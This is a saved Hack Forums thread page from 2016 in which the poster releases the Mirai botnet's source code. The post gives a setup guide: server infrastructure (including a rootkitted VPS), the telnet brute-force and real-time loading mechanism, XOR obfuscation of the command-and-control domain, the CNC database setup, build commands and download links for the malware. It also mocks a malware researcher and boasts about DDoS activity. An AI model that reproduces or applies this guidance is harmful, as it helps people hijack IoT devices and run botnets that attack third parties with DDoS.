+			<li><a href="https://hackforums.net/search.php?action=getfavorites"><i class="fa fa-heart fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Favorites</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=getnew"><i class="fa fa-file-text fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">View New Posts</span></a></li>
+                        <li><a href="https://hackforums.net/search.php?action=finduserthreads&amp;uid=4466395"><i class="fa fa-file-o fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Your Threads</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=finduser&amp;uid=4466395"><i class="fa fa-files-o fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Your Posts</span></a></li>
+			<li class=""><a href="https://hackforums.net/convo.php" title="Conversations"><i class="fa fa-bullhorn fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Conversations</span> (0)</a></li>
+			<li class="user-link-last alerts--new"><a href="https://hackforums.net/private.php"><i class="fa fa-paper-plane-o fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Private Messages</span> (1)</a>
+			<div class="mobile-remove tablet-remove" style="display: inline;padding-left: 5px;">(Unread 1, Total 1)</div></li>
+            <li><a href="https://hackforums.net/member.php?action=logout&amp;logoutkey=8daf18d0bae0944756cbb48b5c4d6875" class="logout" onclick="return confirm('Are you sure that you want to logout?');"><i class="fa fa-sign-out fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Log Out</span></a></li>
+    </ul>
+  </li>
+	</ul></div>
+	<br class="clear">
+</div>
+</div></div><div><div class="navbar" id="myNavbar">
+	<a id="navBarAvatarLink" class="header_avatar" href="javascript:void(0);"><img src="page1_files/default_avatar.png" width="36" height="36"></a>
+	<div id="navHeaderProfileLinks" style="display: none; position: absolute;background-color: #060606;top: 51px;width: 100%;">
+		<div id="navLeftDropdownGroup" style=" display: flex; background-color: #141414; font-weight: bold;">
+			<div id="navLeftDropdownLink" class="nav-left-dropdown-option-active" style="display: inline-block;flex: 1 1 50%;text-align: center;padding: 10px 5px;font-size: 16px;"><i class="fa fa-user fa-lg" aria-hidden="true"></i></div>
+			<div id="navLeftDropdownControl" style="display: inline-block;flex: 1 1 50%;text-align: center;padding: 10px 5px;font-size: 16px;"><i class="fa fa-pencil fa-lg" aria-hidden="true"></i></div>
+			<div id="navLeftDropdownGame" style="display: inline-block;flex: 1 1 50%;text-align: center;padding: 10px 5px;font-size: 16px;"><i class="fa fa-gamepad fa-lg" aria-hidden="true"></i></div>
+			<div id="navLeftDropdownMarket" style="display: inline-block;flex: 1 1 50%;text-align: center;padding: 10px 5px;font-size: 16px;"><i class="fa fa-shopping-basket fa-lg" aria-hidden="true"></i></div>
+		</div>
+		<ul id="navLeftDropdownLinkList" class="dropdown-menu nav-left-dropdown-option-list-active" style="text-align: center;padding: 0; margin: 0; display: none;">
+			<li><a href="https://hackforums.net/member.php?action=profile&amp;uid=4466395" class="usercp" title="My Profile"><i class="fa fa-user fa-lg" aria-hidden="true"></i><span>Profile</span></a></li>
+			<li><a href="https://hackforums.net/private.php" title="Read Your Private Messages"><i class="fa fa-paper-plane-o fa-lg" aria-hidden="true"></i><span>Private Messages <span id="mobileDropdownPMs"> (1)</span></span></a></li>
+			<li><a href="javascript:void(0);" title="Open Comrade List" onclick="MyBB.popupWindow('https://hackforums.net/misc.php?action=buddypopup', null, true); return false;"><i class="fa fa-address-book-o fa-lg" aria-hidden="true"></i><span>Comrades</span></a></li>
+			<li><a href="https://hackforums.net/usercp.php" class="usercp" title="User Control Panel"><i class="fa fa-cog fa-lg" aria-hidden="true"></i><span>Settings</span></a></li>
+			<li><a href="https://hackforums.net/upgrade.php" class="usercp" title="Upgrade"><i class="fa fa-diamond fa-lg" aria-hidden="true"></i><span>Upgrade</span></a></li>
+			<li><a href="https://hackforums.net/member.php?action=logout&amp;logoutkey=8daf18d0bae0944756cbb48b5c4d6875" onclick="return confirm('Are you sure that you want to logout?');" title="Log Out"><i class="fa fa-sign-out fa-lg" aria-hidden="true"></i><span>Log Out</span></a></li>
+		</ul>
+		<ul id="navLeftDropdownControlList" class="dropdown-menu" style="text-align: center;padding: 0;margin: 0; display: none;">
+			<li><a href="https://hackforums.net/quickthread.php" title="Create Thread"><i class="fa fa-pencil fa-lg" aria-hidden="true"></i><span>Create Thread</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=getnew" title="View New Posts"><i class="fa fa-file-text fa-lg" aria-hidden="true"></i><span>New Posts</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=finduserthreads&amp;uid=4466395" title="View Your Threads"><i class="fa fa-file-o fa-lg" aria-hidden="true"></i><span>Your Threads</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=finduser&amp;uid=4466395" title="View Your Posts"><i class="fa fa-files-o fa-lg" aria-hidden="true"></i><span>Your Posts</span></a></li>
+			<li><a href="https://hackforums.net/search.php?action=getfavorites" title="Search Favorites"><i class="fa fa-heart fa-lg" aria-hidden="true"></i><span>Favorites</span></a></li>
+			<li><a href="https://hackforums.net/blog.php" title="Blogs"><i class="fa fa-newspaper-o fa-lg" aria-hidden="true"></i><span>Blogs</span></a></li>
+		</ul>
+		<ul id="navLeftDropdownGameList" class="dropdown-menu" style="text-align: center;padding: 0;margin: 0; display: none;">
+			<li><a href="https://hackforums.net/gamecp.php" class="usercp" title="Hack Game"><i class="fa fa-gamepad fa-lg" aria-hidden="true"></i><span>Hack Game</span></a></li>
+			<li><a href="https://hackforums.net/lottery.php" class="usercp" title="Lottery"><i class="fa fa-ticket fa-lg" aria-hidden="true"></i><span>Lottery</span></a></li>
+			<li><a href="https://hackforums.net/scratchcard.php" class="usercp" title="Scratchcards"><i class="fa fa-clone fa-lg" aria-hidden="true"></i><span>Scratchcards</span></a></li>
+			<li><a href="https://hackforums.net/sportsbook.php" class="usercp" title="Sportsbook"><i class="fa fa-futbol-o fa-lg" aria-hidden="true"></i><span>Sportsbook</span></a></li>
+			<li><a href="https://hackforums.net/blackjack.php" class="usercp" title="Blackjack"><i class="fa fa-money fa-lg" aria-hidden="true"></i><span>Blackjack</span></a></li>
+			<li><a href="https://hackforums.net/slots.php" class="usercp" title="Slots"><i class="fa fa-bomb fa-lg" aria-hidden="true"></i><span>Slots</span></a></li>
+			<li><a href="https://hackforums.net/cryptogame.php" class="usercp" title="Crypto Game"><i class="fa fa-btc fa-lg" aria-hidden="true"></i><span>Crypto Game</span></a></li>
+		</ul>
+		<ul id="navLeftDropdownMarketList" class="dropdown-menu" style="text-align: center;padding: 0;margin: 0; display: none;">
+			<li><a href="https://hackforums.net/marketcp.php?action=profile&amp;uid=4466395" class="usercp" title="Market Profile"><i class="fa fa-address-card fa-lg" aria-hidden="true"></i><span>Market Profile</span></a></li>
+			<li><a href="https://hackforums.net/contracts.php?uid=4466395" title="Contracts"><i class="fa fa-shopping-basket fa-lg" aria-hidden="true"></i><span>Contracts</span></a></li>
+			<li><a href="https://hackforums.net/marketcp.php?action=trusted" title="Your Trusted"><i class="fa fa-thumbs-up fa-lg" aria-hidden="true"></i><span>Your Trusted</span></a></li>
+			<li><a href="https://hackforums.net/marketcp.php?action=vendorlist" title="Vendors"><i class="fa fa-briefcase fa-lg" aria-hidden="true"></i><span>Vendors</span></a></li>
+			<li><a href="https://hackforums.net/buysticky.php" title="Forum Sticky"><i class="fa fa-sticky-note fa-lg" aria-hidden="true"></i><span>Buy Forum Sticky</span></a></li>
+			<li><a href="https://hackforums.net/salestag.php" title="Sales Tag"><i class="fa fa-tag fa-lg" aria-hidden="true"></i><span>Buy Sales Tag</span></a></li>
+		</ul>
+	</div>
+<a href="https://hackforums.net/search.php" onclick="$('#quick_search').modal({ fadeDuration: 150, keepelement: true, zIndex: (typeof modal_zindex !== 'undefined' ? modal_zindex : 9999) }); return false;" id="top-nav-search" class="active"><i class="fa fa-binoculars" aria-hidden="true"></i></a>
+  	<a href="https://hackforums.net/convo.php" id="top-nav-messages"><i class="fa fa-bullhorn" aria-hidden="true"></i><span class="notify-number" id="notify_number_pms">0</span></a>
+  	<a href="javascript:void(0);" id="top-nav-alerts" onclick="Notify.processIconClick();"><i class="fa fa-bell" aria-hidden="true"></i><span class="notify-number" id="notify_number_alerts">0</span></a>
+	<a href="https://hackforums.net/quickthread.php" id="top-nav-quickthread" rel="nofollow"><i class="fa fa-pencil-square" aria-hidden="true" style="font-size: 1.25em;"></i></a>
+  	<a href="javascript:void(0);" class="menu" onclick="toggleNav()">☰</a>
+<script>var notify_count = 0;</script>
+<script src="page1_files/notify_7.js"></script>
+<script type="text/javascript">
+var is_guest_account = false;
+var unread_convo_messages = 0;
+if(unread_convo_messages > 0) {
+	$('#notify_number_pms').show();
+	$('#avatarNavConvoNum').text(' (' + unread_convo_messages + ')');
+}
+
+if(unread_pms > 0) {
+	$('#mobileDropdownPMs').text(' (' + unread_pms + ')');
+}
+	
+if(unread_alerts > 0) {
+	$('#notify_number_alerts').html(unread_alerts);
+	$('#notify_number_alerts').show();
+}
+
+let avatar_string = '';
+
+if(avatar_string) {
+	$('.header_avatar img').attr('src', "https://hackforums.net/" + avatar_string);
+}
+
+var script_name = window.location.pathname;
+	
+if(script_name.includes('alerts.php')) {
+	$('#top-nav-alerts').addClass('active');
+} else if(script_name.includes('search.php') || script_name.includes('forumdisplay.php') ||  script_name.includes('showthread.php')) {
+	$('#top-nav-search').addClass('active');
+} else if(script_name.includes('private.php')) {
+	$('#top-nav-messages').addClass('active');
+}
+
+function processAvatarDropdown() {
+		if(Notify.notifyOpen) {
+			let body_ele = $("body");
+			let header_ele = $("#header");
+			Notify.notifyOpen = false;
+			
+			Notify.notifyContainer.hide();			
+			if(body_ele.hasClass("notify-body-fixed")) {
+				body_ele.removeClass("notify-body-fixed");
+			}
+			
+			if(header_ele.hasClass("header-notify-force-display")) {
+				header_ele.removeClass("header-notify-force-display");
+			}
+		}
+
+			let dropdown = $('#navHeaderProfileLinks');
+
+			if(dropdown.hasClass('nav-left-dropdown-active')) {
+				dropdown.removeClass('nav-left-dropdown-active');
+			} else {
+				dropdown.addClass('nav-left-dropdown-active');
+			}
+		}
+
+		$('#navBarAvatarLink').on('click', function(e) {
+			processAvatarDropdown();
+		});
+
+		$('#navLeftDropdownGroup > div').on('click', function(e) {
+			let tab = $(this);
+			let list = $("#" + tab.attr('id') + "List");
+
+			tab.addClass('nav-left-dropdown-option-active');
+			list.addClass('nav-left-dropdown-option-list-active');
+
+			$("#navLeftDropdownGroup > div").each(function(i) {
+				let other_tab = $(this);
+
+				if(other_tab.attr('id') == tab.attr('id')) {
+					return;
+				}
+
+				let other_list = $("#" + other_tab.attr('id') + "List");
+
+				if(other_tab.hasClass('nav-left-dropdown-option-active')) {
+					other_tab.removeClass('nav-left-dropdown-option-active');
+				}
+
+				if(other_list.hasClass('nav-left-dropdown-option-list-active')) {
+					other_list.removeClass('nav-left-dropdown-option-list-active')
+				}
+
+			});
+		});
+</script>
+
+			                </div>
+		                 </div>
+		<div id="content">
+			<div class="wrapper">
+<!--//
+<div class="error" style="text-align:center;"><em>Bytes Bonus Day! Earn 12 Bytes for each new thread and get 10 Bytes for posting new replies. Earn your Bytes now!</em></div>
+-->
+
+				
+<div class="pm_alert" id="pm_notice" style="border: 2px solid #7d618e !important;">
+	<div><strong>You currently do not have any posts. Up until you create a post your account can be self-deleted</strong> with <a href="https://hackforums.net/misc.php?action=npsd_delete" style="font-weight: bold;">This Link</a>.</div>
+</div>
+
+				
+				
+				
+				
+				
+				
+<div class="breadcrumb">
+
+<a href="https://hackforums.net/index.php" class="breadcrumb-back-arrow" style="display: none;"><i class="fa fa-home" aria-hidden="true"></i></a>
+<span class="arrow" style="display: none;"></span>
+
+<a href="https://hackforums.net/index.php">Hack Forums</a>
+<span class="arrow"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=45" class="breadcrumb-back-arrow" style="display: none;"><i class="fa fa-home" aria-hidden="true"></i></a>
+<span class="arrow" style="display: none;"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=45">Hacks, Exploits, and Various Discussions</a>
+<span class="arrow"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=307" class="breadcrumb-back-arrow" style="display: none;"><i class="fa fa-home" aria-hidden="true"></i></a>
+<span class="arrow" style="display: none;"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=307">Advanced Hacking</a>
+<span class="arrow"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=92" class="breadcrumb-back-arrow" style="display: none;"><i class="fa fa-home" aria-hidden="true"></i></a>
+<span class="arrow" style="display: none;"></span>
+
+<a href="https://hackforums.net/forumdisplay.php?fid=92">Botnets, IRC Bots, and Zombies</a>
+<span class="arrow"></span>
+
+›
+
+<a href="https://hackforums.net/showthread.php?tid=5420472">[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release</a>
+<span class="arrow"></span>
+
+</div>
+
+				<br>
+<div class="mam-header" align="center"><a href="https://www.nakedturtle.me/?ref=hfheader" target="_blank"><img src="page1_files/81.gif"></a><a href="https://xleet.to/" target="_blank"><img src="page1_files/113.gif"></a></div>
+
+	
+	
+	<div class="float_left">
+		
+<div class="pagination">
+
+ <span class="pagination_current">1</span>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=2" class="pagination_page">2</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=3" class="pagination_page">3</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=4" class="pagination_page">4</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=5" class="pagination_page">5</a>
+
+...  <a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=36" class="pagination_last">36</a>
+
+<a href="https://hackforums.net/showthread.php?tid=5420472&amp;page=2" class="pagination_next">Next »</a>
+
+<div class="popup_menu drop_go_page" style="display: none;" id="go_page_1_popup">
+	<label for="page">Jump to page:</label> <input type="text" class="textbox" name="paginationPageNum" value="1" size="4" style="min-width: 20px !important;">
+	<button class="button" type="button" onclick="paginationJumpGo($(this));">Go</button>
+</div>
+<a href="javascript:;" class="go_page" title="Jump to page" id="go_page_1"><i class="fa fa-chevron-down"></i></a>&nbsp;
+<script type="text/javascript">
+	function paginationJumpGo(paginationJumpNum) {
+		var new_page_num = parseInt(paginationJumpNum.prev().val());
+		if(isNaN(new_page_num)) {
+			new_page_num = 1;
+		}
+		window.open("https://hackforums.net/showthread.php?tid=5420472&page=" + new_page_num, "_self")
+	}
+
+	var go_page = 'go_page_' + $(".go_page").length;
+	$(".go_page").last().attr('id', go_page);
+	$(".drop_go_page").last().attr('id', go_page + '_popup');
+	$('#' + go_page).popupMenu(false).click(function() {
+		var drop_go_page = $(this).prev('.drop_go_page');
+		if (drop_go_page.is(':visible')) {
+			drop_go_page.find('.textbox').focus();
+		}
+	});
+</script>
+
+</div>
+
+	</div>
+	<div class="float_right mobile-remove">
+		
+<a href="https://hackforums.net/newreply.php?tid=5420472" class="button closed_button" rel="nofollow"><span>Thread Closed</span></a>&nbsp;
+
+	</div>
+	
+<article>
+	<table class="tborder tfixed clear" cellspacing="0" cellpadding="5" border="0">
+		<tbody><tr>
+			<td class="thead">
+				<div class="float_right">
+					<span class="smalltext"><strong><a href="javascript:void(0);" id="thread_modes"><i class="fa fa-cog oc-hf-icon icon-top fa-lg"></i></a></strong></span>
+				</div>
+				<div>
+					<strong></strong><h1>[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release</h1>
+				</div>
+			</td>
+		</tr>
+<tr><td id="posts_container">
+	<div id="posts">
+		
+
+<a name="pid52615667" id="pid52615667"></a>
+<div class="post classic  clear" style="" id="post_52615667">
+<div class="post_wrapper">
+<div class="post_author scaleimages">
+	
+<div class="author_avatar"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035" title="Anna-senpai joined Jul 2016"><img src="page1_files/default_avatar_002.png" alt="Anna-senpai" width="100" height="100"></a></div>
+
+	<div class="author_information">
+			<strong><span class="largetext"><a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035"><span style="color:#383838">Anna-senpai</span></a></span></strong> 
+<img src="page1_files/buddy_offline.png" title="Offline" alt="Offline" class="buddy_status">
+<br>
+			<span class="smalltext">
+				[closed@HF:]<br>
+				
+				
+			</span>
+                        <div class="post_myawards"></div>
+	</div>
+	<div class="author_statistics">
+		<div class="author_wrapper">
+		     
+	<div class="author_row"><div class="author_label">Posts:</div> <div class="author_value">247</div></div>
+	<div class="author_row"><div class="author_label">Threads:</div> <div class="author_value">9</div></div>
+	
+	
+	
+<div class="author_row"><div class="author_label">B Rating:</div><div class="author_value"><a href="https://hackforums.net/marketcp.php?action=brating&amp;uid=3201035" title="Business Rating of Anna-senpai"><strong class="reputation_positive" style="padding-left: 5px;">0</strong><strong style="padding-left: 5px; color: white;">0</strong><strong class="reputation_negative" style="padding-left: 5px;">0</strong></a></div></div><div class="author_row"><div class="author_label">Popularity:</div> <div class="author_value">
+<a href="https://hackforums.net/reputation.php?uid=3201035" rel="nofollow"><strong class="reputation_positive">12</strong></a>
+</div></div>
+
+    <div class="author_row"><div class="author_label">βytes:</div> <div class="author_value"><a href="javascript:void(0)" onclick="MyBB.popupWindow('/myps.php?action=donate&amp;uid=3201035&amp;pid=52615667&amp;modal=1'); return false;" rel="nofollow"><i class="fa fa-plus-circle" style="color: #4CAF50;" aria-hidden="true"></i></a><a href="https://hackforums.net/misc.php?action=help&amp;hid=43" rel="nofollow"><strong> β</strong></a> 0</div></div>
+	<div class="author_row"><div class="author_label">Game XP:</div> <div class="author_value"><a href="https://hackforums.net/gamecp.php?action=profile&amp;uid=3201035" title="Hacker Game Anna-senpai Profile">0</a></div></div>
+
+		</div>
+	</div>
+</div>
+<div class="post_content">
+	<div class="post_head">
+		
+<div class="float_right" style="vertical-align: top; position: relative;">
+<a href="javascript:void(0);" class="share_button" onclick="Thread.toggleShare(52615667);" data-tooltip="Share"><i class="fa fa-share-alt" aria-hidden="true"></i></a>
+<!-- IS_UNREAD --><strong><a href="https://hackforums.net/showthread.php?tid=5420472&amp;pid=52615667#pid52615667" id="post_url_52615667" title="[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release" rel="nofollow">#1</a></strong>
+
+</div>
+
+		
+		<time datetime="2016-09-30T12:50:52-07:00"></time><span class="post_date">09-30-2016, 07:50 PM <span class="post_edit" id="edited_by_52615667">
+<span class="edited_post">(This post was last modified: 10-02-2016, 02:57 AM by <a href="https://hackforums.net/member.php?action=profile&amp;uid=3201035">Anna-senpai</a>.)</span>
+</span></span>
+	
+	</div>
+	<div class="post_body scaleimages" id="pid_52615667">
+		<span style="font-size: x-large;" class="mycode_size">Preface</span><br>
+Greetz everybody,<br>
+<br>
+When I first go in DDoS industry, I wasn't planning on staying in it 
+long. I made my money, there's lots of eyes looking at IOT now, so it's 
+time to GTFO. However, I know every skid and their mama, it's their wet 
+dream to have something besides qbot.<br>
+<br>
+So today, I have an amazing release for you. With Mirai, I usually pull 
+max 380k bots from telnet alone. However, after the Kreb DDoS, ISPs been
+ slowly shutting down and cleaning up their act. Today, max pull is 
+about 300k bots, and dropping.<br>
+<br>
+So, I am your senpai, and I will treat you real nice, my hf-chan.<br>
+<br>
+And to everyone that thought they were doing anything by hitting my CNC,
+ I had good laughs, this bot uses domain for CNC. It takes 60 seconds 
+for all bots to reconnect, lol<br>
+<br>
+Also, shoutout to this blog post by malwaremustdie<br>
+<a href="http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html" target="_blank" rel="ugc" class="mycode_url">http://blog.malwaremustdie.org/2016/08/m...-just.html</a><br>
+<a href="https://web.archive.org/web/20160930230210/http://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-just.html" target="_blank" rel="ugc" class="mycode_url">https://web.archive.org/web/201609302302...-just.html</a> &lt;- backup in case low quality reverse engineer unixfreaxjp decides to edit his posts lol<br>
+Had a lot of respect for you, thought you were good reverser, but you 
+really just completely and totally failed in reversing this binary. "We 
+still have better kung fu than you kiddos" don't make me laugh please, 
+you made so many mistakes and even confused some different binaries with
+ my. LOL<br>
+<br>
+Let me give you some slaps back -<br>
+1) port 48101 is not for back connect, it is for control to prevent multiple instances of bot running together<br>
+2) /dev/watchdog and /dev/misc are not for "making the delay", it for 
+preventing system from hanging. This one is low-hanging fruit, so sad 
+that you are extremely dumb<br>
+3) You failed and thought FAKE_CNC_ADDR and FAKE_CNC_PORT was real CNC, lol "And doing the backdoor to connect via HTTP on  <a href="javascript:void(0)" onclick="MyBB.popupWindow('https://hackforums.net/ipcheck.php?action=iplookup&amp;ipaddress=65.222.202.53&amp;modal=1', null, true); return false;" rel="nofollow">65.222.202.53</a>". you got tripped up by signal flow ;) try harder skiddo<br>
+4) Your skeleton tool sucks ass, it thought the attack decoder was 
+"sinden style", but it does not even use a text-based protocol? CNC and 
+bot communicate over binary protocol<br>
+5) you say 'chroot("/") so predictable like torlus' but you don't 
+understand, some others kill based on cwd. It shows how out-of-the-loop 
+you are with real malware. Go back to skidland<br>
+<br>
+5 slaps for you<br>
+<br>
+Why are you writing reverse engineer tools? You cannot even correctly 
+reverse in the first place. Please learn some skills first before trying
+ to impress others. Your arrogance in declaring how you "beat me" with 
+your dumb kung-fu statement made me laugh so hard while eating my SO had
+ to pat me on the back.<br>
+<br>
+Just as I forever be free, you will be doomed to mediocracy forever.<br>
+<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Requirements</span><br>
+<span style="font-weight: bold;" class="mycode_b">Bare Minimum</span><br>
+2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading<br>
+<br>
+<span style="font-weight: bold;" class="mycode_b">Pro Setup (my setup)</span><br>
+2 VPS and 4 servers<br>
+- 1 VPS with extremely bulletproof host for database server<br>
+- 1 VPS, rootkitted, for scanReceiver and distributor<br>
+- 1 server for CNC (used like 2% CPU with 400k bots)<br>
+- 3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally)<br>
+<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Infrastructure Overview</span><br>
+- To establish connection to CNC, bots resolve a domain (resolv.c/resolv.h) and connect to that IP address<br>
+- Bots brute telnet using an advanced SYN scanner that is around 80x 
+faster than the one in qbot, and uses almost 20x less resources. When 
+finding bruted result, bot resolves another domain and reports it. This 
+is chained to a separate server to automatically load onto devices as 
+results come in.<br>
+- Bruted results are sent by default on port 48101. The utility called 
+scanListen.go in tools is used to receive bruted results (I was getting 
+around 500 bruted results per second at peak). If you build in debug 
+mode, you should see the utitlity scanListen binary appear in debug 
+folder.<br>
+<br>
+Mirai uses a spreading mechanism similar to self-rep, but what I call 
+"real-time-load". Basically, bots brute results, send it to a server 
+listening with scanListen utility, which sends the results to the 
+loader. This loop (brute -&gt; scanListen -&gt; load -&gt; brute) is 
+known as real time loading.<br>
+<br>
+The loader can be configured to use multiple IP address to bypass port 
+exhaustion in linux (there are limited number of ports available, which 
+means that there is not enough variation in tuple to get more than 65k 
+simultaneous outbound connections - in theory, this value lot less). I 
+would have maybe 60k - 70k simultaneous outbound connections 
+(simultaneous loading) spread out across 5 IPs.<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Configuring Bot</span><br>
+Bot has several configuration options that are obfuscated in 
+(table.c/table.h). In ./mirai/bot/table.h you can find most descriptions
+ for configuration options. However, in ./mirai/bot/table.c there are a 
+few options you *need* to change to get working.<br>
+<br>
+- TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance 
+very fun with mirai, people try to hit my CNC but I update it faster 
+than they can find new IPs, lol. Retards :)<br>
+- TABLE_CNC_PORT - Port to connect to, its set to 23 already<br>
+- TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to<br>
+- TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already.<br>
+<br>
+In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file<br>
+<br>
+Run this inside mirai directory<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">./build.sh debug telnet</code></div></div>You
+ will get some errors related to cross-compilers not being there if you 
+have not configured them. This is ok, won't affect compiling the enc 
+tool<br>
+<br>
+Now, in the ./mirai/debug folder you should see a compiled binary called
+ enc. For example, to get obfuscated string for domain name for bots to 
+connect to, use this:<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">./debug/enc string fugg.the.police.com</code></div></div><br>
+The output should look like this<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">XOR'ing 20 bytes of data...<br>
+\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22</code></div></div><br>
+To update the TABLE_CNC_DOMAIN value for example, replace  that long hex
+ string with the one provided by enc tool. Also, you see "XOR'ing 20 
+bytes of data". This value must replace the last argument tas well. So 
+for example, the table.c line originally looks like this<br>
+<br>
+[/code]<br>
+add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com<br>
+[/code]<br>
+<br>
+Now that we know value from enc tool, we update it like this<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">add_entry(TABLE_CNC_DOMAIN,
+ 
+"\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22",
+ 20); // fugg.the.police.com</code></div></div><br>
+Some values are strings, some are port (uint16 in network order / big endian).<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Configuring CNC</span><br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">apt-get install mysql-server mysql-client</code></div></div>CNC requires database to work. When you install database, go into it and run following commands:<br>
+<a href="https://pastebin.com/86d0iL9g" target="_blank" rel="ugc" class="mycode_url">http://pastebin.com/86d0iL9g</a><br>
+<br>
+This will create database for you. To add your user,<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');</code></div></div><br>
+Now, go into file ./mirai/cnc/main.go<br>
+<br>
+Edit these values<br>
+<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">const DatabaseAddr string&nbsp;&nbsp; = "127.0.0.1"<br>
+const DatabaseUser string&nbsp;&nbsp; = "root"<br>
+const DatabasePass string&nbsp;&nbsp; = "password"<br>
+const DatabaseTable string&nbsp;&nbsp;= "mirai"</code></div></div><br>
+To the information for the mysql server you just installed<br>
+<br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Setting Up Cross Compilers</span><br>
+Cross compilers are easy, follow the instructions at this link to set 
+up. You must restart your system or reload .bashrc file for these 
+changes to take effect.<br>
+<br>
+<a href="https://pastebin.com/1rRCc3aD" target="_blank" rel="ugc" class="mycode_url">http://pastebin.com/1rRCc3aD</a><br>
+<br>
+<span style="font-size: x-large;" class="mycode_size">Building CNC+Bot</span><br>
+The CNC, bot, and related tools:<br>
+1) <a href="http://santasbigcandycane.cx/mirai.src.zip" target="_blank" rel="ugc" class="mycode_url">http://santasbigcandycane.cx/mirai.src.zip</a> - <span style="font-weight: bold;" class="mycode_b">THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP!</span><br>
+<img src="page1_files/BVc7qJs.png" alt="[Image: BVc7qJs.png]" class="mycode_img"><br>
+<br>
+2) <a href="http://santasbigcandycane.cx/loader.src.zip" target="_blank" rel="ugc" class="mycode_url">http://santasbigcandycane.cx/loader.src.zip</a> - <span style="font-weight: bold;" class="mycode_b">THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP!</span><br>
+<br>
+How to build bot + CNC<br>
+In mirai folder, there is build.sh script.<br>
+<br>
+<div class="codeblock"><div class="title">Code <span class="copynotice" style="color: white; position: relative; left: 4px; top: 1px; cursor: pointer;" title="Select All + Copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span></div><div class="body" dir="ltr"><code class="phpcode">./build.sh debug telnet</code></div></div>Will
+ output debug binaries of bot that will not daemonize and print out info
+ about if it can connect to CNC, etc, status of floods, etc. Compiles to
+ ./mirai/debug folder<br>
+<br>
